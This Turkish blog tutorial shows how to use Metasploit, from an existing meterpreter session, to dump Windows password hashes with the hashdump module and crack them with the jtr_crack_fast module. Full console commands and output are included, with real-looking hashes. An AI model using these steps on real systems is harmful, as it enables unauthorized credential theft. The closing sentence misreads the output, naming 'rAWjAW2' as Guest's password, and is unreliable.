---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:42:00Z"
excerpt: John The Ripper programı, karmaşık algoritmalı parolaları çözmek için kullanılan
  bir programdır. Bir takım kelime listelerini kullanarak hash olarak kaydedilmiş
  kodları çözmeye çalışır.
guid: https://www.siberoloji.com/?p=1201
id: 1201
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF İçinde John The Ripper
url: /tr/msf-icinde-john-the-ripper/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="john-the-ripper">John the Ripper 
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>John The Ripper programı, karmaşık algoritmalı parolaları çözmek için kullanılan bir programdır. Bir takım kelime listelerini kullanarak hash olarak kaydedilmiş kodları çözmeye çalışır.</p>
  

<!-- wp:paragraph -->
<p>Metasploit içerisinde de John The Ripper kullanabilirsiniz. Burada kullanılacak John the Ripper, basit algoritmalarla ilgilenir. Çok karmaşık ve ileri düzey hash kodları için Metasploit dışında çalışmanız gerektiğini belirtelim. Metasploit içindeki John the Ripper, sadece LM veya NTLM hash kodlarını çözmek için başlangıç düzeyinde işlem yapmanıza yarar. Bir örnekle görelim.</p>
  

<!-- wp:paragraph -->
<p>Öncelikle hedef bilgisayarda meterpreter oturum açtığımızı kabul ediyoruz.&nbsp;<code>session 1</code>&nbsp;olarak aktif halde olan oturum için&nbsp;<code>post/windows/gather/hashdump</code>&nbsp;modülünü aktif hale getirip hash bilgilerini alalım.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf auxiliary<strong>(</strong>handler<strong>)</strong> <strong>&gt;</strong> use post/windows/gather/hashdump
msf post<strong>(</strong>hashdump<strong>)</strong> <strong>&gt;</strong> set session 1
session <strong>=&gt;</strong> 1
 
msf post<strong>(</strong>hashdump<strong>)</strong> <strong>&gt;</strong> run

<strong>[</strong><strong>*</strong><strong>]</strong> Obtaining the boot key...
<strong>[</strong><strong>*</strong><strong>]</strong> Calculating the hboot key using SYSKEY bffad2dcc991597aaa19f90e8bc4ee00...
<strong>[</strong><strong>*</strong><strong>]</strong> Obtaining the user list and keys...
<strong>[</strong><strong>*</strong><strong>]</strong> Decrypting user keys...
<strong>[</strong><strong>*</strong><strong>]</strong> Dumping password hashes...


Administrator:500:cb5f77772e5178b77b9fbd79429286db:b78fe104983b5c754a27c1784544fda7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:810185b1c0dd86dd756d138f54162df8:7b8f23708aec7107bfdf0925dbb2fed7:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:8be4bbf2ad7bd7cec4e1cdddcd4b052e:::
rAWjAW:1003:aad3b435b51404eeaad3b435b51404ee:117a2f6059824c686e7a16a137768a20:::
rAWjAW2:1004:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::


<strong>[</strong><strong>*</strong><strong>]</strong> Post module execution completed
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Hash bilgilerini ekranda görebilirsiniz. Şimdi&nbsp;<code>auxiliary/analyze/jtr_crack_fast</code>&nbsp;modülünü kullanalım.</p>
  

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">msf post<strong>(</strong>hashdump<strong>)</strong> <strong>&gt;</strong> use auxiliary/analyze/jtr_crack_fast
msf auxiliary<strong>(</strong>jtr_crack_fast<strong>)</strong> <strong>&gt;</strong> run

<strong>[</strong><strong>*</strong><strong>]</strong> Seeded the password database with 8 words...

guesses: 3  time: 0:00:00:04 DONE <strong>(</strong>Sat Jul 16 19:59:04 2011<strong>)</strong>  c/s: 12951K  trying: WIZ1900 - ZZZ1900
Warning: passwords printed above might be partial and not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
<strong>[</strong><strong>*</strong><strong>]</strong> Output: Loaded 7 password hashes with no different salts <strong>(</strong>LM DES <strong>[</strong>128/128 BS SSE2]<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Output: D                <strong>(</strong>cred_6:2<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Output: PASSWOR          <strong>(</strong>cred_6:1<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Output: GG               <strong>(</strong>cred_1:2<strong>)</strong>
Warning: mixed-case charset, but the current hash type is <strong>case</strong>-insensitive;
some candidate passwords may be unnecessarily tried more than once.
guesses: 1  time: 0:00:00:05 DONE <strong>(</strong>Sat Jul 16 19:59:10 2011)  c/s: 44256K  trying: <strong>||</strong>V<strong>}</strong> - <strong>||</strong>|<strong>}</strong>
Warning: passwords printed above might be partial and not be all those cracked
Use the "--show" option to display all of the cracked passwords reliably
<strong>[</strong><strong>*</strong><strong>]</strong> Output: Loaded 7 password hashes with no different salts <strong>(</strong>LM DES <strong>[</strong>128/128 BS SSE2]<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Output: Remaining 4 password hashes with no different salts
<strong>[</strong><strong>*</strong><strong>]</strong> Output: <strong>(</strong>cred_2<strong>)</strong>
guesses: 0  time: 0:00:00:00 DONE <strong>(</strong>Sat Jul 16 19:59:10 2011<strong>)</strong>  c/s: 6666K  trying: 89093 - 89092
<strong>[</strong><strong>*</strong><strong>]</strong> Output: Loaded 7 password hashes with no different salts <strong>(</strong>LM DES <strong>[</strong>128/128 BS SSE2]<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Output: Remaining 3 password hashes with no different salts
guesses: 1  time: 0:00:00:11 DONE <strong>(</strong>Sat Jul 16 19:59:21 2011<strong>)</strong>  c/s: 29609K  trying: zwingli1900 - password1900
Use the "--show" option to display all of the cracked passwords reliably
<strong>[</strong><strong>*</strong><strong>]</strong> Output: Loaded 6 password hashes with no different salts <strong>(</strong>NT MD4 <strong>[</strong>128/128 SSE2 + 32/32]<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Output: password         <strong>(</strong>cred_6<strong>)</strong>
guesses: 1  time: 0:00:00:05 DONE <strong>(</strong>Sat Jul 16 19:59:27 2011<strong>)</strong>  c/s: 64816K  trying: <strong>||</strong>|<strong>}</strong>
Use the "--show" option to display all of the cracked passwords reliably
<strong>[</strong><strong>*</strong><strong>]</strong> Output: Loaded 6 password hashes with no different salts <strong>(</strong>NT MD4 <strong>[</strong>128/128 SSE2 + 32/32]<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Output: Remaining 5 password hashes with no different salts
<strong>[</strong><strong>*</strong><strong>]</strong> Output: <strong>(</strong>cred_2<strong>)</strong>
guesses: 0  time: 0:00:00:00 DONE <strong>(</strong>Sat Jul 16 19:59:27 2011<strong>)</strong>  c/s: 7407K  trying: 89030 - 89092
<strong>[</strong><strong>*</strong><strong>]</strong> Output: Loaded 6 password hashes with no different salts <strong>(</strong>NT MD4 <strong>[</strong>128/128 SSE2 + 32/32]<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Output: Remaining 4 password hashes with no different salts

<strong>[</strong>+] Cracked: Guest: <strong>(</strong>192.168.184.134:445<strong>)</strong>
<strong>[</strong>+] Cracked: rAWjAW2:password <strong>(</strong>192.168.184.134:445<strong>)</strong>
<strong>[</strong><strong>*</strong><strong>]</strong> Auxiliary module execution completed
msf auxiliary<strong>(</strong>jtr_crack_fast<strong>)</strong> <strong>&gt;</strong>
</code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Görüldüğü gibi&nbsp;<code>192.168.184.134</code>&nbsp;IP adresinde&nbsp;<code>Guest</code>&nbsp;kullanıcısı için parola&nbsp;<code>rAWjAW2</code>&nbsp;olarak bulundu.</p>
  